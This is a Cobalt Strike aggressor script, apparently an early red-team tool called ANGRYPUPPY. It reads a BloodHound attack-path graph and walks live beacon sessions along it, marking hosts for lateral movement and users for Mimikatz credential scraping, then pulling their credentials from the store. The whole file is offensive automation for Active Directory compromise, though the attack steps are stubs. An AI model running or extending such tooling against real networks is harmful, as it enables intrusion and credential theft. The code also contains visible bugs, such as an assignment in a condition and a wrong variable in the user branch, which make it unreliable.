# ANGRYPUPPY.cna
# Automate BloodHound attack path in Cobalt Strike
#
# Authors: Calvin Hedler (@001SPARTaN) and Vincent Yiu (@vysecurity)
#
# TODO: How to capture relationships - http://sleep.dashnine.org/manual/datastruct.html#3 ?

# org.json from https://mvnrepository.com/artifact/org.json/json
# Documentation - https://stleary.github.io/JSON-java/
import org.json.* from: /Users/vysec/Desktop/Tools/ANGRYPUPPY/json.jar;
include(script_resource("cypher.cna"));
include(script_resource("utils.cna"));

# Parse BloodHound graph.json and add nodes

# Ordered array with attack path in format
# @(@(%node, relationship), @(%node, relationship), @(%lastnode))
global('@relationships @edges @nodes $waitFor $currentBid $nextLabel $attackActive $pos');

sub parseNodes {
    local('$json');

    $json = $1;

    # Create new JSONObject from string
    $obj = [new JSONObject: $json];

    # Create a new JSONArray from the "nodes" key
    $nodeArray = [new JSONArray: [$obj get: "nodes"]];

    # How many nodes?
    $length = [$nodeArray length];
    #println("Number of nodes: $length");

    # Iterate through all nodes and add to appropriate array
    for ($i = 0; $i < $length; $i++) {
        # Hash to store individual node information
        %node = %();

        $id = [[$nodeArray get: $i] get: "id"];
        $type = [[$nodeArray get: $i] get: "type"];
        $label = [[$nodeArray get: $i] get: "label"];

        %node["id"] = $id;
        %node["label"] = $label;
        %node["type"] = $type;

        add(@nodes, %node, -1);
    }

    foreach %node (@nodes) {
        if (%node["type"] eq "Computer") {
            #println("Computer: " . %node["label"]);
        }
        else if (%node["type"] eq "User") {
            #println("User: " . %node["label"]);
        }
    }
}

sub parseEdges {
    local('$json');
    $json = $1;

    $obj = [new JSONObject: $json];

    $edgeArray = [new JSONArray: [$obj get: "edges"]];

    $length = [$edgeArray length];
    #println("Number of edges: $length");

    for ($i = 0; $i < $length; $i++) {
        %edge = %();

        $id = [[$edgeArray get: $i] get: "id"];
        $label = [[$edgeArray get: $i] get: "label"];
        $source = [[$edgeArray get: $i] get: "source"];
        $target = [[$edgeArray get: $i] get: "target"];

        %edge["id"] = $id;
        %edge["label"] = $label;
        %edge["source"] = $source;
        %edge["target"] = $target;

        @edges[$i] = %edge;
        #println("Added edge: " . %edge);
    }
}

sub getFirstNode {
    local('@targets');

    foreach %edge (@edges) {
        add(@targets, %edge["target"]);
    }
    foreach %edge (@edges) {
        if (%edge["source"] !isin @targets) {
            foreach %node (@nodes) {
                if (%edge["source"] eq %node["id"]) {
                    #println("First node is: " . %node["id"]);
                    return %node;
                }
            }
        }
    }
}

sub getNextNode {
    local('%sourceNode');
    %sourceNode = $1;

    foreach %edge (@edges) {
        if (%edge["source"] == %sourceNode["id"]) {
                foreach %node (@nodes) {
                    if (%node["id"] == %edge["target"]) {
                        #println("Found next node: " . %node["id"]);
                        return %node;
                    }
                }
            }
    }
}

sub sortNodes {
    local ('@sorted %firstNode $length');

    $length = size(@nodes);

    %firstNode = getFirstNode();

    add(@sorted, %firstNode, 0);

    for ($i = 1; $i < $length; $i++){
        %next = getNextNode(@sorted[-1]);
        add(@sorted, %next, -1);
    }

    # println("Sorted nodes: " . @sorted);

    return @sorted;
}

sub removeGroups {
	
	@nodes = $1;

	foreach $i => $item (@nodes){
    	if ($item["type"] ne "Group"){
    		if ($item["type"] eq "User"){
    			$item["label"] = bhUserToCS-sub($item["label"]);
    		}
    		push(@final, $item);
    	}
    }

    return @final;
}

sub parseGraph {
    local('$graph $json $file');
    $graph = $1;
    $file = openf($graph);

    while $line (readln($file)) {
        $json = $json . $line;
    }

    closef($file);

    parseNodes($json);
    parseEdges($json);

    @nodelist = sortNodes();

    @final = removeGroups(@nodelist);

    # Set currentBid to first node

    # If Start node is a computer
    if (@final[0]["type"] eq "Computer"){
    	$cLabel = @final[0]["label"];
    	foreach $session (beacons()) {
			if ($cLabel eq $session["computer"]) {
				$currentBid = $session["id"];
			}
		}
	}
    else{
    	# Start node is a user
    	$uLabel = @final[0]["label"];
    	foreach $session (beacons()) {
			if ($cLabel eq $session["user"]) {
				$currentBid = $session["id"];
			}
		}
    }

    # $currentBid is now the start node.

   	# Reset waitFor
    $waitFor = "";

    $attackActive = $True;

 	$pos = 0;


}

on heartbeat_1s{

	if ($attackActive){
		# Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
		$next = @final[$pos + 1];
		$nextLabel = $next["label"];
		if (@final[$pos + 1]["type"] eq "Computer"){
			println("[LATERAL] : $nextLabel");
			
			println("Waiting");
		    if ($waitFor eq $nextLabel) {
		    	# We got the beacon back and change the bid to the new one
		    	foreach $session (beacons()) {
					if ($nextLabel eq $session["computer"]) {
						$currentBid = $session["id"];
						break;
					}
				}
				if ($currentBid["computer"] eq $nextLabel){
					# All good to go
					$pos = $pos + 1;
				}
			}
			else if ($waitFor ne "") {
			  	# Error occured, let's reset waitFor
			   	$waitFor = "";
			   	println("Error: WaitFor override with wrong beacon");
			}			
		
		}
		else {
			println("[MIMIKATZ]: $nextLabel");
			
			# At this point we already know we have a COMPUTER sesssion going, with SYSTEM, so we can just scrape the credentials.
			# If all works fine, $currentBid contains the machine we are working on and should be scraping creds from

			if ($waitFor eq $nextLabel) {
				# We got the set of credentials we need in the cred store, we want to grab it out now.
				foreach $cred (credentials()){
					if ($nextLabel eq $cred["user"]){
						# Current $Cred object 
						$targetCreds = $cred;
						break;
					}
				}
				if ($targetCreds["user"] eq $nextLabel){
					# All good to go
					$pos = $pos + 1;
				}
				else{
					println("Credentials are not found in credential store for the target");
				}
			}
			else if ($waitFor ne "") {
				$waitFor = "";
				println("Error: WaitFor override with wrong credentials");
			}
		}
		if ($pos = size(@final)){
			# Finished attack path

			println("[*] Attack finished");
			$attackActive = $False;
		}
	}	# End $attackActive
}

parseGraph(getFileProper(script_resource("graphs"), "graph4.json"));
